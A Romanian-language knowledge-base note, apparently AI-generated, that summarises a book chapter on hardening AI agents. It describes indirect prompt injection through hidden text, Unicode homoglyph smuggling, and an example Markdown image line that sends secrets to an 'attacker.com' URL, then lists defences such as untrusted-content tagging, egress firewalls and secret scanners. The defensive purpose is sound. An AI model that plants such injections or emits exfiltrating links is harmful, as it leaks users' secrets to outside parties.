---
id: 2566d3a6-14b4-4434-af27-081ca69c18f5
type: knowledge
lifecycle: REVIEW
category: agents/adversarial_defense_egress_firewall
tags:
- agents
- zvarydchuk
- prompt-injection
- unicode-smuggling
- egress-filtering
- least-privilege
- hardening
created: '2026-09-04'
updated: '2026-09-04'
provenance:
  source_type: ai
  source_ref: 06_INBOX/RAW_IMPORTS/BOOKS/Vasyl-Zvarydchuk-Agent-Powered-Apps-Ch10
confidence: high
verification: unverified
relations:
- relation: references
  target: 01_KNOWLEDGE/BOOKS/CAPSTONE_Agent_Swarm_Blackboard_and_Dynamic_Orchestration.md
- relation: references
  target: 01_KNOWLEDGE/BOOKS/Caiet_Teme_Aplicatii_Practice_Carti.md
- relation: references
  target: 00_CORE/GRAPH/07 Knowledge Domains Map.md
---

# Agent Hardening: Ap?rare Adversarial?, Filtrare Egress & Prevenirea Furtului de Context

**Surs?**: Vasyl Zvarydchuk, *Building Agent-Powered Applications* (Capitolul 10: Securitate ?i Izolare)  
**Domeniu**: Securitate Cibernetic? Agentic?, Sandboxing de Ie?ire & Neutralizare Prompt Injection

---

## 1. Vectori de Atac Asupra Agen?ilor Autonomi
Agen?ii care proceseaz? date din surse externe (e-mailuri, PDF-uri, repo-uri git, pagini web) sunt vulnerabili la atacuri specifice:
1. **Indirect Prompt Injection**: Inserarea de instruc?iuni ascunse ?n documente ne?ncredin?ate (ex: text alb pe fundal alb, comentarii HTML, caractere invizibile Unicode Zero-Width).
2. **Unicode Smuggling / Homoglyphs**: Ocolirea filtrelor regex prin caractere chirilice identice vizual cu cele latine sau caractere din blocul de tag-uri (U+E0000).
3. **Data Exfiltration via Markdown/Images**: For?area modelului s? emit? imagini Markdown de tip `![leak](https://attacker.com/log?data=...)` care transmit secretele extrase din memorie ?n parametrii URL.

## 2. Arhitectura de Ap?rare ?n Ad?ncime (Defense-in-Depth)
Securizarea fluxului agentic impune bariere structurale irevocabile:
- **Demarcare XML cu Reguli de Parsare Pasiv?**: Marcarea strict? `<untrusted_content>` ?i instruirea modelului la nivel de prompt de sistem s? refuze meta-instruc?iunile din aceste blocuri.
- **Egress Firewall la Nivel de Subproces**: Blocarea accesului la re?ea (`0.0.0.0/0`) din containerul sau subprocesul de execu?ie, permi??nd doar rute c?tre proxy-uri locale certificate mTLS.
- **Sanitizer de Secrete la Ie?ire**: Scanarea tuturor r?spunsurilor finale ale agentului ?nainte de afi?are/trimitere folosind detectoare de entropie Shannon ?i semn?turi regex pentru tokeni JWT, chei AWS, private keys ?i hash-uri criptografice.

## 3. Leg?turi Canonice & Graf de Cuno?tin?e
- [[Agent_Architecture_and_Tool_Orchestration]]
- [[CAPSTONE_Agent_Swarm_Blackboard_and_Dynamic_Orchestration]]
- [[Caiet_Teme_Aplicatii_Practice_Carti]]
- [[07 Knowledge Domains Map]]
